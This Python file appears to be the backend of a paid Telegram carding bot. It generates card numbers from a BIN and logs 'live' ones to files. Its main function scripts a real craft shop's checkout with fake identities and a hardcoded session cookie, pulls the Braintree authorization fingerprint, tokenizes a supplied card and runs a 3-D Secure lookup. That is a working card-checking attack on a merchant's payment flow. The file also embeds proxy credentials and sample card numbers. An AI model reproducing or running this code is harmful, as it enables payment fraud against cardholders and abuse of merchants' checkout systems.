import os
import time
from bson.json_util import dumps
from telegraph import upload_file
from pyrogram import filters
from pyrogram.client import Client
from pyrogram.methods import messages
from pyrogram import (
    Client,
    client,
    filters)
import random
import string
import redis
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup)
import re
from datetime import datetime
import pymongo
import os
import base64
import time
import urllib
from bson.json_util import dumps
from telegraph import upload_file
from pyrogram import filters
from pyrogram.client import Client
from pyrogram.methods import messages
from pyrogram import Client, client, filters
import random
import string
import redis
from requests.exceptions import ProxyError
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import requests
from datetime import datetime
import pymongo
import array
import re
import random
import bs4
import json


mongourl = 'MONGO_URI'
client = pymongo.MongoClient(mongourl,serverSelectionTimeoutMS=5000)
maindb = client.bot['main']

antidb = redis.Redis(host='REDIS_URI', port=REDIS_PASS, password='REDIS_PASS')

BOT_USERNAME = 'BOT_USERNAME'
loggp = -735069168
waste_cards = [1,2,7,8,9,0]
banned_bins = open('files/bannedbin.txt', 'r').readlines()
admins = open('files/admins.txt', 'r').readlines()
verified_gps = open('files/groups.txt', 'r').readlines()

group_not_allowed = """<b>This Group Is Not Verified. Talk With <code>@r0ld3x</code> And Take Verification.</b>"""
use_not_registered = """<b>Register Yourself To Use Me. Hit /register To Register Yourself</b>"""
buy_premium = """<b>Take Paid Plan To Use Me In Private Mode. Hit /buy To See My Premium Plans</b>"""
free_user = """<b>buy paid plan to use this gate hit /buy to see my premium plans</b>"""


# arr = [
#     'http://copunwcs-rotate:zpxyewfj84cp@p.webshare.io:80/',
#     'http://juigtril-rotate:7iwuusjuufgp@p.webshare.io:80/',
#     'http://bfpiydpo-rotate:jommyvzkwcdl@p.webshare.io:80/',
#     'http://vctalybl-rotate:9bs22acxfssz@p.webshare.io:80/',
#     'http://tnfpjnnj-rotate:9krjtv3qgzmo@p.webshare.io:80/',
#     'http://tnfpjnnj-rotate:9krjtv3qgzmo@p.webshare.io:80/']
# proxy = random.choice(arr)
# proxies = { 'http' : proxy, 'https' : proxy}
# curl =  requests.Session()
# curl.proxies = proxies


# res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
# random_data = json.loads(res.text)
# phone_number = "225"+ "-" + str(random.randint(111,999))+ "-" +str(random.randint(0000,9999))
# first_name = random_data['results'][0]['name']['first']
# last_name = random_data['results'][0]['name']['last']
# street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name']
# city = random_data['results'][0]['location']['city']
# state = random_data['results'][0]['location']['state']
# zip = random_data['results'][0]['location']['postcode']
# email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com'
# password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))



ccs = []
def cc_gen(cc, mes = 'x', ano = 'x', cvv = 'x',amount = 'x',): 
    if amount != 'x':
        amount = int(amount)
    else:
        amount = 15
    genrated = 0
    while(genrated < amount):
        genrated += 1
        s="0123456789"
        l = list(s)
        random.shuffle(l)
        result = ''.join(l)
        result = cc + result
        if cc[0] == "3":
            ccgen = result[0:15]
        else:
            ccgen = result[0:16]
        if mes == 'x':
            mesgen = random.randint(1,12)
            if len(str(mesgen)) == 1:
                mesgen = "0" + str(mesgen)
        else:
            mesgen = mes
        if ano == 'x':
            anogen = random.randint(2021,2029)
        else:
            anogen = ano
        if cvv == 'x':
            if cc[0] == "3":
                cvvgen = random.randint(1000,9999) 
            else:
                cvvgen = random.randint(100,999)
        else:
            cvvgen = cvv   
        lista = str(ccgen) +"|" + str(mesgen) + "|"+ str(anogen) + "|" + str(cvvgen) + "\n"
        ccs.append(lista)



sk_headers = {
    "authority": "api.stripe.com",
    "accept": "application/json",
    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.stripe.com",
    "referer": "https://js.stripe.com/",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}

def make_ordinal(n):
    n = int(n)
    suffix = ['th', 'st', 'nd', 'rd', 'th'][min(n % 10, 4)]
    if 11 <= (n % 100) <= 13:
        suffix = 'th'
    return str(n) + suffix

def lista(dets):
    arrays = re.findall(r'[0-9]+', dets)
    return arrays 

def get_email(): 
    generated_email = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))) + '@gmail.com'
    return generated_email.lower()

def get_username():  
    generated_username = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)))
    return generated_username.capitalize()

def get_time_taken(val):
    current_time = time.time()
    time_taken = current_time - val
    return str(time_taken)[:4]

def get_part_of_day():
    h = datetime.now().hour
    if h < 12:
        return "Good Morning <b>⛅</b>"
    elif h >= 11 and h < 16:
        return "Good Afternoon <b>🌣</b>"
    elif h >= 17 and h < 19:
        return "Good Evening <b>🌅</b>"
    elif h >= 19 and h < 24:
        return "Good Night <b>🌃</b> "
    else:
        return "Hello"

def save_live(lista):
    file = open('files/cvvs/cvv.txt', 'a+') 
    if str(lista) + "\n" not in file.readlines():
        file.write(str(lista) + "\n")
        file.close()

def save_ccn(lista):
    file = open('files/cvvs/ccn.txt', 'a+') 
    if str(lista) + "\n" not in file.readlines():
        file.write(str(lista) + "\n")
        file.close()

def main(cc,mes,ano,cvv):
    cc = str(cc)
    mes = str(mes)
    ano = str(ano)
    cvv = str(cvv)
    req = requests.Session()
    res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
    phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
    user_name = get_username()
    email = get_email()
    password = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)))
    random_data = json.loads(res.text)
    first_name = random_data['results'][0]['name']['first']
    last_name = random_data['results'][0]['name']['last']
    street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
    city = random_data['results'][0]['location']['city']
    state = random_data['results'][0]['location']['state']
    zip = random_data['results'][0]['location']['postcode']
    # cc = "4862212062005756"
    # mes = "12"
    # ano = "2023"
    # cvv = "374"
    # "4266063380638824","expirationMonth":"12","expirationYear":"2024","cvv":"912"
    # req = requests.Session()
    # req.proxies = {
    # "http": "http://copunwcs-rotate:zpxyewfj84cp@p.webshare.io:80/",
    # "https": "http://copunwcs-rotate:zpxyewfj84cp@p.webshare.io:80/",
    # }
    res = requests.get("https://adyen-enc-and-bin-info.herokuapp.com/bin/" + cc)
    bin_data = json.loads(res.text)
    res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
    random_data = json.loads(res.text)
    phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
    first_name = random_data['results'][0]['name']['first']
    last_name = random_data['results'][0]['name']['last']
    street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
    city = random_data['results'][0]['location']['city']
    state = random_data['results'][0]['location']['state']
    zip = random_data['results'][0]['location']['postcode']
    vendor = bin_data["data"]["vendor"].lower()
    email = get_email()
    password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10)))

    headers = {
    'authority':'buddlycrafts.com',
    'method':'POST',
    'path':'/checkout/step1/',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'cache-control':'max-age=0',
    'content-length':'29',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'sessionid=mlgzbdcrydieukv7nkntkm4ljirjqvwi',
    'dnt':'1',
    'origin':'https://buddlycrafts.com',
    'referer':'https://buddlycrafts.com/checkout/step1/',
    'sec-ch-ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Linux"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'upgrade-insecure-requests':'1',
    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }
    data = f'email={get_username()}%40gmail.com'
    step1 = req.post("https://buddlycrafts.com/checkout/step1/", headers=headers, data=data)
    token1 = re.search(r'/checkout/step2/(.*)/', step1.text)
    cbid = token1.group(1)

    url = f'https://buddlycrafts.com/checkout/step2/{cbid}/'
    headers = {
    'authority':'buddlycrafts.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'sessionid=mlgzbdcrydieukv7nkntkm4ljirjqvwi',
    'dnt':'1',
    'origin':'https://buddlycrafts.com',
    'referer': url,
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Linux"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'upgrade-insecure-requests':'1',
    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }
    data = f'country=US&name={first_name}+{last_name}&line1=3+Allen+Street&line2=&town_or_city=New+York&us_state=NY&county_or_state=NY&postal_code=NY&phone={phone_number}'
    step1 = req.post(url,headers=headers, data=data)



    url = f'https://buddlycrafts.com/checkout/step3/{cbid}/'
    headers = {
    'authority':'buddlycrafts.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'sessionid=mlgzbdcrydieukv7nkntkm4ljirjqvwi',
    'origin':'https://buddlycrafts.com',
    'referer': url,
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Linux"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'upgrade-insecure-requests':'1',
    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }
    data = 'payment_method=braintree'
    step1 = req.post(url,headers=headers, data=data)


    url = f'https://buddlycrafts.com/checkout/step4/{cbid}/'
    headers = {
    'authority':'buddlycrafts.com',
    'method':'POST',
    'scheme':'https',
    'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'content-type':'application/x-www-form-urlencoded',
    'cookie':'sessionid=mlgzbdcrydieukv7nkntkm4ljirjqvwi',
    'dnt':'1',
    'origin':'https://buddlycrafts.com',
    'referer': url,
    'sec-ch-ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Linux"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'upgrade-insecure-requests':'1',
    'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }
    data = 'payment_method=braintree'
    step1 = req.get(url,headers=headers)
    token1 = re.search(r'client_token": "(.*)", "m', step1.text)
    auth = token1.group(1)
    base64_bytes = auth.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    main_bearer = re.search(r'"authorizationFingerprint":"(.*)","configUrl', message).group(1)
    merchant_id = re.search(r'"merchant_id": "(.*)", "vault', step1.text).group(1)

    bearer = f'Bearer {main_bearer}'
    headers = {
    'Accept':'*/*',
    'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'Authorization': bearer,
    'Braintree-Version':'2018-05-10',
    'Content-Type':'application/json',
    'Host':'payments.braintree-api.com',
    'Origin':'https://assets.braintreegateway.com',
    'Referer':'https://assets.braintreegateway.com/',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Linux"',
    'Sec-Fetch-Dest':'empty',
    'Sec-Fetch-Mode':'cors',
    'Sec-Fetch-Site':'cross-site',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }

    data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"4b8fc5b9-12b6-4855-b2c4-f31ee3837785"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"' +  cc +'","expirationMonth":"' + mes +'","expirationYear":"' + ano +'","cvv":"' + cvv +'","cardholderName":"Carolyn watson"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
    step1 = req.post("https://payments.braintree-api.com/graphql",headers=headers,data=data)
    json_load = json.loads(step1.text)
    tokencc = json_load['data']['tokenizeCreditCard']['token']

    url = f'https://api.braintreegateway.com/merchants/{merchant_id}/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup'
    headers = {
    'Accept':'*/*',
    'Accept-Language':'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
    'Content-Type':'application/json',
    'Host':'api.braintreegateway.com',
    'Origin':'https://buddlycrafts.com',
    'Referer':'https://buddlycrafts.com/',
    'sec-ch-ua':'"Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
    'sec-ch-ua-mobile':'?0',
    'sec-ch-ua-platform':'"Linux"',
    'Sec-Fetch-Dest':'empty',
    'Sec-Fetch-Mode':'cors',
    'Sec-Fetch-Site':'cross-site',
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    }
    data = '{"amount":"11.47","additionalInfo":{"shippingGivenName":"Carolyn","shippingSurname":"watson","shippingPhone":"2259773937","billingLine1":"999 Main Street","billingLine2":"","billingCity":"New York","billingState":"NY","billingPostalCode":"10002","billingCountryCode":"US","billingPhoneNumber":"2259773937","billingGivenName":"Carolyn","billingSurname":"watson","shippingLine1":"999 Main Street","shippingLine2":"","shippingCity":"New York","shippingState":"NY","shippingPostalCode":"10002","shippingCountryCode":"US","email":"godofheroku@gmail.com"},"bin":"426606","dfReferenceId":"0_9e4bae0f-d3ae-4806-8430-bdb6cc635e99","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.68.0","cardinalDeviceDataCollectionTimeElapsed":4656,"issuerDeviceDataCollectionTimeElapsed":8368,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"' + main_bearer + '","braintreeLibraryVersion":"braintree/web/3.68.0","_meta":{"merchantAppId":"buddlycrafts.com","platform":"web","sdkVersion":"3.68.0","source":"client","integration":"custom","integrationType":"custom","sessionId":"4b8fc5b9-12b6-4855-b2c4-f31ee3837785"}}'
    step1 = req.post(url,headers=headers,data=data)
    response = step1.json()
    res = response['paymentMethod']['threeDSecureInfo']
    enrolled = res['enrolled']
    return enrolled

# def get_random_info():
    # res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
    # if res.status_code != requests.codes.ok:
    #     await msg.edit_text("InValid Bin ")
    # else:
        # phone_number = "225"+str(random.randint(000,999))+str(random.randint(0000,9999))
        # user_name = get_username()
        # email = get_email()
        # password = str(''.join(random.choices(string.ascii_uppercase + string.digits, k = 10)))
        # random_data = json.loads(res.text)
        # first_name = random_data['results'][0]['name']['first']
        # last_name = random_data['results'][0]['name']['last']
        # street = str(random_data['results'][0]['location']['street']['number'])+" " +random_data['results'][0]['location']['street']['name']
        # city = random_data['results'][0]['location']['city']
        # state = random_data['results'][0]['location']['state']
        # zip = random_data['results'][0]['location']['postcode']



        